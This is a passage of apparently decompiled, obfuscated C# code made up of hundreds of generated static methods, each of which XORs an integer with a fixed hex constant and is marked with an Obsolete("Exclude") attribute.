		return int_4 ^ 0x77C31723;
	}

	[Obsolete("Exclude")]
	public static int smethod_4931(int int_4)
	{
		return int_4 ^ 0x2F7EB878;
	}

	[Obsolete("Exclude")]
	public static int smethod_4932(int int_4)
	{
		return int_4 ^ 0x620C387F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4933(int int_4)
	{
		return int_4 ^ 0x39B78C4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4934(int int_4)
	{
		return int_4 ^ 0x46842862;
	}

	[Obsolete("Exclude")]
	public static int smethod_4935(int int_4)
	{
		return int_4 ^ 0x2BE0E770;
	}

	[Obsolete("Exclude")]
	public static int smethod_4936(int int_4)
	{
		return int_4 ^ 0x62536492;
	}

	[Obsolete("Exclude")]
	public static int smethod_4937(int int_4)
	{
		return int_4 ^ 0x6BAE6610;
	}

	[Obsolete("Exclude")]
	public static int smethod_4938(int int_4)
	{
		return int_4 ^ 0x1C3311CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4939(int int_4)
	{
		return int_4 ^ 0x7D61933A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4940(int int_4)
	{
		return int_4 ^ 0x5CBAA836;
	}

	[Obsolete("Exclude")]
	public static int smethod_4941(int int_4)
	{
		return int_4 ^ 0x4715E185;
	}

	[Obsolete("Exclude")]
	public static int smethod_4942(int int_4)
	{
		return int_4 ^ 0x2662D9EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4943(int int_4)
	{
		return int_4 ^ 0x7ADEDD8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4944(int int_4)
	{
		return int_4 ^ 0x3CB3A5CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4945(int int_4)
	{
		return int_4 ^ 0x9DEE3EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4946(int int_4)
	{
		return int_4 ^ 0x52801341;
	}

	[Obsolete("Exclude")]
	public static int smethod_4947(int int_4)
	{
		return int_4 ^ 0x544712CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4948(int int_4)
	{
		return int_4 ^ 0xE4C11B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4950(int int_4)
	{
		return int_4 ^ 0x4AAC6295;
	}

	[Obsolete("Exclude")]
	public static int smethod_4951(int int_4)
	{
		return int_4 ^ 0x81CC271;
	}

	[Obsolete("Exclude")]
	public static int smethod_4952(int int_4)
	{
		return int_4 ^ 0x585E8175;
	}

	[Obsolete("Exclude")]
	public static int smethod_4953(int int_4)
	{
		return int_4 ^ 0x4AB26B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4954(int int_4)
	{
		return int_4 ^ 0x17030B16;
	}

	[Obsolete("Exclude")]
	public static int smethod_4955(int int_4)
	{
		return int_4 ^ 0x33FE9B46;
	}

	[Obsolete("Exclude")]
	public static int smethod_4956(int int_4)
	{
		return int_4 ^ 0x1D647D25;
	}

	[Obsolete("Exclude")]
	public static int smethod_4957(int int_4)
	{
		return int_4 ^ 0xB30812E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4958(int int_4)
	{
		return int_4 ^ 0x47B11949;
	}

	[Obsolete("Exclude")]
	public static int smethod_4959(int int_4)
	{
		return int_4 ^ 0x455273E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4960(int int_4)
	{
		return int_4 ^ 0x3F1C92D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4961(int int_4)
	{
		return int_4 ^ 0x25D7DCCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4962(int int_4)
	{
		return int_4 ^ 0x597BD6D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4963(int int_4)
	{
		return int_4 ^ 0x5714CBE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4964(int int_4)
	{
		return int_4 ^ 0x7E255A2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4965(int int_4)
	{
		return int_4 ^ 0x280A9EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4966(int int_4)
	{
		return int_4 ^ 0x23BC5F9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4967(int int_4)
	{
		return int_4 ^ 0x1B6587A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4968(int int_4)
	{
		return int_4 ^ 0x571EE7B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4969(int int_4)
	{
		return int_4 ^ 0x3F6E7E3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4970(int int_4)
	{
		return int_4 ^ 0x44942E6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4971(int int_4)
	{
		return int_4 ^ 0x6134D34B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4972(int int_4)
	{
		return int_4 ^ 0xB9F66C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4973(int int_4)
	{
		return int_4 ^ 0x6FA1BCE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4974(int int_4)
	{
		return int_4 ^ 0x229E71CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4975(int int_4)
	{
		return int_4 ^ 0x5E941C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4976(int int_4)
	{
		return int_4 ^ 0x5C2368E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4977(int int_4)
	{
		return int_4 ^ 0x5FCB8677;
	}

	[Obsolete("Exclude")]
	public static int smethod_4978(int int_4)
	{
		return int_4 ^ 0x480171C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4979(int int_4)
	{
		return int_4 ^ 0x2616D0DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4980(int int_4)
	{
		return int_4 ^ 0x6CB94918;
	}

	[Obsolete("Exclude")]
	public static int smethod_4981(int int_4)
	{
		return int_4 ^ 0x133C1BFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4982(int int_4)
	{
		return int_4 ^ 0x78E1DAC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4983(int int_4)
	{
		return int_4 ^ 0x5657F82A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4984(int int_4)
	{
		return int_4 ^ 0xD80C7CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4985(int int_4)
	{
		return int_4 ^ 0x25EDA448;
	}

	[Obsolete("Exclude")]
	public static int smethod_4986(int int_4)
	{
		return int_4 ^ 0x715E1DF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4987(int int_4)
	{
		return int_4 ^ 0xDCE110C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4988(int int_4)
	{
		return int_4 ^ 0x2967C63;
	}

	[Obsolete("Exclude")]
	public static int smethod_4989(int int_4)
	{
		return int_4 ^ 0x7958EDCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4990(int int_4)
	{
		return int_4 ^ 0x5C8842E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4991(int int_4)
	{
		return int_4 ^ 0x63C060D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4992(int int_4)
	{
		return int_4 ^ 0x51C319BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4993(int int_4)
	{
		return int_4 ^ 0x69B4A5C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4994(int int_4)
	{
		return int_4 ^ 0x1FA2A098;
	}

	[Obsolete("Exclude")]
	public static int smethod_4995(int int_4)
	{
		return int_4 ^ 0x538B951;
	}

	[Obsolete("Exclude")]
	public static int smethod_4996(int int_4)
	{
		return int_4 ^ 0x7BE222F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4997(int int_4)
	{
		return int_4 ^ 0x201FAD75;
	}

	[Obsolete("Exclude")]
	public static int smethod_4998(int int_4)
	{
		return int_4 ^ 0x624C646A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4999(int int_4)
	{
		return int_4 ^ 0x2F6FADEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5000(int int_4)
	{
		return int_4 ^ 0x2C9E56C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5001(int int_4)
	{
		return int_4 ^ 0x7B7DAD23;
	}

	[Obsolete("Exclude")]
	public static int smethod_5002(int int_4)
	{
		return int_4 ^ 0x3B1F87A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5003(int int_4)
	{
		return int_4 ^ 0x73AFC76C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5004(int int_4)
	{
		return int_4 ^ 0x7053CFEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5005(int int_4)
	{
		return int_4 ^ 0x395DB6F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5006(int int_4)
	{
		return int_4 ^ 0x732944A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5007(int int_4)
	{
		return int_4 ^ 0x2A4588C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5008(int int_4)
	{
		return int_4 ^ 0x8E659C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5009(int int_4)
	{
		return int_4 ^ 0x410C9935;
	}

	[Obsolete("Exclude")]
	public static int smethod_5010(int int_4)
	{
		return int_4 ^ 0x610AE832;
	}

	[Obsolete("Exclude")]
	public static int smethod_5011(int int_4)
	{
		return int_4 ^ 0x16BDE36A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5012(int int_4)
	{
		return int_4 ^ 0x26763619;
	}

	[Obsolete("Exclude")]
	public static int smethod_5013(int int_4)
	{
		return int_4 ^ 0x12CC1A6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5014(int int_4)
	{
		return int_4 ^ 0x9BBEF8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5015(int int_4)
	{
		return int_4 ^ 0x2A7EF6DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5016(int int_4)
	{
		return int_4 ^ 0x6F8780B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5017(int int_4)
	{
		return int_4 ^ 0x4A71C9AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5018(int int_4)
	{
		return int_4 ^ 0x69813BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5019(int int_4)
	{
		return int_4 ^ 0x9F782C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5020(int int_4)
	{
		return int_4 ^ 0x84AF36C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5021(int int_4)
	{
		return int_4 ^ 0x3A502F7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5022(int int_4)
	{
		return int_4 ^ 0xEA460A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5023(int int_4)
	{
		return int_4 ^ 0x4B6A51A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5024(int int_4)
	{
		return int_4 ^ 0x1DE3739;
	}

	[Obsolete("Exclude")]
	public static int smethod_5025(int int_4)
	{
		return int_4 ^ 0x6C151CA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5026(int int_4)
	{
		return int_4 ^ 0x2DF79C23;
	}

	[Obsolete("Exclude")]
	public static int smethod_5028(int int_4)
	{
		return int_4 ^ 0x503A064A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5029(int int_4)
	{
		return int_4 ^ 0x8E840C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5030(int int_4)
	{
		return int_4 ^ 0x5FEC1048;
	}

	[Obsolete("Exclude")]
	public static int smethod_5031(int int_4)
	{
		return int_4 ^ 0x517F0002;
	}

	[Obsolete("Exclude")]
	public static int smethod_5032(int int_4)
	{
		return int_4 ^ 0x521A4423;
	}

	[Obsolete("Exclude")]
	public static int smethod_5033(int int_4)
	{
		return int_4 ^ 0x35BD251;
	}

	[Obsolete("Exclude")]
	public static int smethod_5034(int int_4)
	{
		return int_4 ^ 0x351C631D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5035(int int_4)
	{
		return int_4 ^ 0x6218A47;
	}

	[Obsolete("Exclude")]
	public static int smethod_5036(int int_4)
	{
		return int_4 ^ 0x21E24564;
	}

	[Obsolete("Exclude")]
	public static int smethod_5037(int int_4)
	{
		return int_4 ^ 0x531CE31E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5038(int int_4)
	{
		return int_4 ^ 0x470E2862;
	}

	[Obsolete("Exclude")]
	public static int smethod_5039(int int_4)
	{
		return int_4 ^ 0x61B4D726;
	}

	[Obsolete("Exclude")]
	public static int smethod_5040(int int_4)
	{
		return int_4 ^ 0x527AB232;
	}

	[Obsolete("Exclude")]
	public static int smethod_5041(int int_4)
	{
		return int_4 ^ 0x18EA8136;
	}

	[Obsolete("Exclude")]
	public static int smethod_5042(int int_4)
	{
		return int_4 ^ 0x4CCE6DE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5043(int int_4)
	{
		return int_4 ^ 0x14C5DF5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5044(int int_4)
	{
		return int_4 ^ 0x797503F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5045(int int_4)
	{
		return int_4 ^ 0x1AFCBC04;
	}

	[Obsolete("Exclude")]
	public static int smethod_5046(int int_4)
	{
		return int_4 ^ 0x82722D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5047(int int_4)
	{
		return int_4 ^ 0x512DC431;
	}

	[Obsolete("Exclude")]
	public static int smethod_5048(int int_4)
	{
		return int_4 ^ 0x1FECFD4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5049(int int_4)
	{
		return int_4 ^ 0x6D17A2AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5050(int int_4)
	{
		return int_4 ^ 0x35A869F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5051(int int_4)
	{
		return int_4 ^ 0x6B9194E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5052(int int_4)
	{
		return int_4 ^ 0x6D5D3F38;
	}

	[Obsolete("Exclude")]
	public static int smethod_5053(int int_4)
	{
		return int_4 ^ 0x7F443008;
	}

	[Obsolete("Exclude")]
	public static int smethod_5054(int int_4)
	{
		return int_4 ^ 0x2FACE6CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5055(int int_4)
	{
		return int_4 ^ 0x21D9E1EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5056(int int_4)
	{
		return int_4 ^ 0x36EEFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5057(int int_4)
	{
		return int_4 ^ 0x4FC327F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5058(int int_4)
	{
		return int_4 ^ 0x5220E6AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5059(int int_4)
	{
		return int_4 ^ 0x50630ADA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5060(int int_4)
	{
		return int_4 ^ 0x3C62941;
	}

	[Obsolete("Exclude")]
	public static int smethod_5061(int int_4)
	{
		return int_4 ^ 0x34FF01C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5062(int int_4)
	{
		return int_4 ^ 0x3D3F6072;
	}

	[Obsolete("Exclude")]
	public static int smethod_5063(int int_4)
	{
		return int_4 ^ 0x14FA7952;
	}

	[Obsolete("Exclude")]
	public static int smethod_5064(int int_4)
	{
		return int_4 ^ 0x67A3C160;
	}

	[Obsolete("Exclude")]
	public static int smethod_5065(int int_4)
	{
		return int_4 ^ 0x688CBDCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5066(int int_4)
	{
		return int_4 ^ 0x78A9F263;
	}

	[Obsolete("Exclude")]
	public static int smethod_5067(int int_4)
	{
		return int_4 ^ 0x59CC9FB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5068(int int_4)
	{
		return int_4 ^ 0x76DDC374;
	}

	[Obsolete("Exclude")]
	public static int smethod_5069(int int_4)
	{
		return int_4 ^ 0x6342245E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5070(int int_4)
	{
		return int_4 ^ 0x6C1F69A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5071(int int_4)
	{
		return int_4 ^ 0x3BBAF16B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5072(int int_4)
	{
		return int_4 ^ 0x10C42B51;
	}

	[Obsolete("Exclude")]
	public static int smethod_5073(int int_4)
	{
		return int_4 ^ 0x438038DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5074(int int_4)
	{
		return int_4 ^ 0x2452D4CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5075(int int_4)
	{
		return int_4 ^ 0x45040A3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5076(int int_4)
	{
		return int_4 ^ 0x18FB56AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5077(int int_4)
	{
		return int_4 ^ 0x4D15C9DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5078(int int_4)
	{
		return int_4 ^ 0x2663BB42;
	}

	[Obsolete("Exclude")]
	public static int smethod_5079(int int_4)
	{
		return int_4 ^ 0x3E5BC0D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5080(int int_4)
	{
		return int_4 ^ 0x4EC67E5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5083(int int_4)
	{
		return int_4 ^ 0x13F3B56C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5084(int int_4)
	{
		return int_4 ^ 0x603ABD04;
	}

	[Obsolete("Exclude")]
	public static int smethod_5085(int int_4)
	{
		return int_4 ^ 0x6F869A5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5086(int int_4)
	{
		return int_4 ^ 0x6048FC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5087(int int_4)
	{
		return int_4 ^ 0x63955FDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5088(int int_4)
	{
		return int_4 ^ 0x2257AFC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5089(int int_4)
	{
		return int_4 ^ 0x42846E16;
	}

	[Obsolete("Exclude")]
	public static int smethod_5090(int int_4)
	{
		return int_4 ^ 0x788CC6EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5091(int int_4)
	{
		return int_4 ^ 0x15D0FBC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5092(int int_4)
	{
		return int_4 ^ 0x19326118;
	}

	[Obsolete("Exclude")]
	public static int smethod_5093(int int_4)
	{
		return int_4 ^ 0x43827B4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5094(int int_4)
	{
		return int_4 ^ 0x1F810401;
	}

	[Obsolete("Exclude")]
	public static int smethod_5095(int int_4)
	{
		return int_4 ^ 0x12F1336D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5096(int int_4)
	{
		return int_4 ^ 0x7D764E36;
	}

	[Obsolete("Exclude")]
	public static int smethod_5097(int int_4)
	{
		return int_4 ^ 0x2B979DBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5098(int int_4)
	{
		return int_4 ^ 0x54DC576;
	}

	[Obsolete("Exclude")]
	public static int smethod_5099(int int_4)
	{
		return int_4 ^ 0x2999599E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5100(int int_4)
	{
		return int_4 ^ 0x4E6DC13;
	}

	[Obsolete("Exclude")]
	public static int smethod_5101(int int_4)
	{
		return int_4 ^ 0x4B567700;
	}

	[Obsolete("Exclude")]
	public static int smethod_5102(int int_4)
	{
		return int_4 ^ 0x60B4F6E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5103(int int_4)
	{
		return int_4 ^ 0x4A478628;
	}

	[Obsolete("Exclude")]
	public static int smethod_5104(int int_4)
	{
		return int_4 ^ 0x5B68A0F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5105(int int_4)
	{
		return int_4 ^ 0x1D0C33D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5106(int int_4)
	{
		return int_4 ^ 0x1991FAA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5107(int int_4)
	{
		return int_4 ^ 0x5582C43E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5108(int int_4)
	{
		return int_4 ^ 0x36BBFFB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5109(int int_4)
	{
		return int_4 ^ 0x6D4BF1F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5110(int int_4)
	{
		return int_4 ^ 0x5025D13C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5111(int int_4)
	{
		return int_4 ^ 0x5BA978BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5112(int int_4)
	{
		return int_4 ^ 0x66D3CC31;
	}

	[Obsolete("Exclude")]
	public static int smethod_5113(int int_4)
	{
		return int_4 ^ 0x7FEDA929;
	}

	[Obsolete("Exclude")]
	public static int smethod_5114(int int_4)
	{
		return int_4 ^ 0xF2196B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5115(int int_4)
	{
		return int_4 ^ 0x7D1BAD09;
	}

	[Obsolete("Exclude")]
	public static int smethod_5116(int int_4)
	{
		return int_4 ^ 0x5005B141;
	}

	[Obsolete("Exclude")]
	public static int smethod_5117(int int_4)
	{
		return int_4 ^ 0xE5CCFEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5118(int int_4)
	{
		return int_4 ^ 0x1CD27922;
	}

	[Obsolete("Exclude")]
	public static int smethod_5119(int int_4)
	{
		return int_4 ^ 0x138DA7D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5120(int int_4)
	{
		return int_4 ^ 0x3AAB20AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5121(int int_4)
	{
		return int_4 ^ 0x5674616D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5122(int int_4)
	{
		return int_4 ^ 0x778767B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5123(int int_4)
	{
		return int_4 ^ 0x61F2D4C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5124(int int_4)
	{
		return int_4 ^ 0x15C2AA58;
	}

	[Obsolete("Exclude")]
	public static int smethod_5125(int int_4)
	{
		return int_4 ^ 0x2120E4E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5126(int int_4)
	{
		return int_4 ^ 0x2D86E53D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5127(int int_4)
	{
		return int_4 ^ 0x20FFA925;
	}

	[Obsolete("Exclude")]
	public static int smethod_5128(int int_4)
	{
		return int_4 ^ 0x62DC937F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5129(int int_4)
	{
		return int_4 ^ 0x31F900D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5130(int int_4)
	{
		return int_4 ^ 0x601A4A87;
	}

	[Obsolete("Exclude")]
	public static int smethod_5131(int int_4)
	{
		return int_4 ^ 0x137E5CC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5132(int int_4)
	{
		return int_4 ^ 0x4D131B85;
	}

	[Obsolete("Exclude")]
	public static int smethod_5133(int int_4)
	{
		return int_4 ^ 0x620F050F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5134(int int_4)
	{
		return int_4 ^ 0x25C73143;
	}

	[Obsolete("Exclude")]
	public static int smethod_5135(int int_4)
	{
		return int_4 ^ 0x4505E27F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5136(int int_4)
	{
		return int_4 ^ 0x3A26CB58;
	}

	[Obsolete("Exclude")]
	public static int smethod_5137(int int_4)
	{
		return int_4 ^ 0xEF26BA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5138(int int_4)
	{
		return int_4 ^ 0x9ECCE78;
	}

	[Obsolete("Exclude")]
	public static int smethod_5139(int int_4)
	{
		return int_4 ^ 0x2ED7BF55;
	}

	[Obsolete("Exclude")]
	public static int smethod_5140(int int_4)
	{
		return int_4 ^ 0x4BBDE9B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5141(int int_4)
	{
		return int_4 ^ 0x7120BDD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5142(int int_4)
	{
		return int_4 ^ 0x5A66BBF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5143(int int_4)
	{
		return int_4 ^ 0x7F2A5076;
	}

	[Obsolete("Exclude")]
	public static int smethod_5144(int int_4)
	{
		return int_4 ^ 0x742E959;
	}

	[Obsolete("Exclude")]
	public static int smethod_5145(int int_4)
	{
		return int_4 ^ 0x43933143;
	}

	[Obsolete("Exclude")]
	public static int smethod_5146(int int_4)
	{
		return int_4 ^ 0x7CE58663;
	}

	[Obsolete("Exclude")]
	public static int smethod_5147(int int_4)
	{
		return int_4 ^ 0x2AE650BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5148(int int_4)
	{
		return int_4 ^ 0x2ABCDAAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5149(int int_4)
	{
		return int_4 ^ 0x2A9CC3BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5151(int int_4)
	{
		return int_4 ^ 0x4958F053;
	}

	[Obsolete("Exclude")]
	public static int smethod_5152(int int_4)
	{
		return int_4 ^ 0x57138FC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5153(int int_4)
	{
		return int_4 ^ 0x6A261FC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5154(int int_4)
	{
		return int_4 ^ 0xBBB723A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5155(int int_4)
	{
		return int_4 ^ 0x290638FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5156(int int_4)
	{
		return int_4 ^ 0xB8D79AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5157(int int_4)
	{
		return int_4 ^ 0x1E3FF45A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5158(int int_4)
	{
		return int_4 ^ 0x4CCF2B83;
	}

	[Obsolete("Exclude")]
	public static int smethod_5159(int int_4)
	{
		return int_4 ^ 0x602721A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5160(int int_4)
	{
		return int_4 ^ 0xC3153CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5161(int int_4)
	{
		return int_4 ^ 0x68C475DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5162(int int_4)
	{
		return int_4 ^ 0x63A26306;
	}

	[Obsolete("Exclude")]
	public static int smethod_5163(int int_4)
	{
		return int_4 ^ 0x1B88E1AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5164(int int_4)
	{
		return int_4 ^ 0x79844CC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5165(int int_4)
	{
		return int_4 ^ 0x7241972;
	}

	[Obsolete("Exclude")]
	public static int smethod_5166(int int_4)
	{
		return int_4 ^ 0x60C93DC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5167(int int_4)
	{
		return int_4 ^ 0x3B2D1356;
	}

	[Obsolete("Exclude")]
	public static int smethod_5168(int int_4)
	{
		return int_4 ^ 0x73CD8A21;
	}

	[Obsolete("Exclude")]
	public static int smethod_5169(int int_4)
	{
		return int_4 ^ 0x18265BBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5170(int int_4)
	{
		return int_4 ^ 0x36A59396;
	}

	[Obsolete("Exclude")]
	public static int smethod_5171(int int_4)
	{
		return int_4 ^ 0x60623742;
	}

	[Obsolete("Exclude")]
	public static int smethod_5172(int int_4)
	{
		return int_4 ^ 0x73627B11;
	}

	[Obsolete("Exclude")]
	public static int smethod_5173(int int_4)
	{
		return int_4 ^ 0x68ECD16;
	}

	[Obsolete("Exclude")]
	public static int smethod_5174(int int_4)
	{
		return int_4 ^ 0x413765A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5175(int int_4)
	{
		return int_4 ^ 0x2A7C169;
	}

	[Obsolete("Exclude")]
	public static int smethod_5176(int int_4)
	{
		return int_4 ^ 0x12314050;
	}

	[Obsolete("Exclude")]
	public static int smethod_5177(int int_4)
	{
		return int_4 ^ 0x338C77E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5178(int int_4)
	{
		return int_4 ^ 0x5A42F41D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5179(int int_4)
	{
		return int_4 ^ 0x9B9B184;
	}

	[Obsolete("Exclude")]
	public static int smethod_5180(int int_4)
	{
		return int_4 ^ 0x7D993F44;
	}

	[Obsolete("Exclude")]
	public static int smethod_5181(int int_4)
	{
		return int_4 ^ 0x3BD3B69;
	}

	[Obsolete("Exclude")]
	public static int smethod_5182(int int_4)
	{
		return int_4 ^ 0x172876F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5183(int int_4)
	{
		return int_4 ^ 0xE3A467E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5184(int int_4)
	{
		return int_4 ^ 0x5E808085;
	}

	[Obsolete("Exclude")]
	public static int smethod_5185(int int_4)
	{
		return int_4 ^ 0x388E2CE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5186(int int_4)
	{
		return int_4 ^ 0x73C99D6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5187(int int_4)
	{
		return int_4 ^ 0x5CA9EBF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5188(int int_4)
	{
		return int_4 ^ 0x9344D86;
	}

	[Obsolete("Exclude")]
	public static int smethod_5189(int int_4)
	{
		return int_4 ^ 0xB673CD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5190(int int_4)
	{
		return int_4 ^ 0x18EF5C16;
	}

	[Obsolete("Exclude")]
	public static int smethod_5191(int int_4)
	{
		return int_4 ^ 0x66D87D03;
	}

	[Obsolete("Exclude")]
	public static int smethod_5192(int int_4)
	{
		return int_4 ^ 0x18D15D7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5193(int int_4)
	{
		return int_4 ^ 0xF848337;
	}

	[Obsolete("Exclude")]
	public static int smethod_5194(int int_4)
	{
		return int_4 ^ 0x5211EAD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5195(int int_4)
	{
		return int_4 ^ 0x6B104FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5196(int int_4)
	{
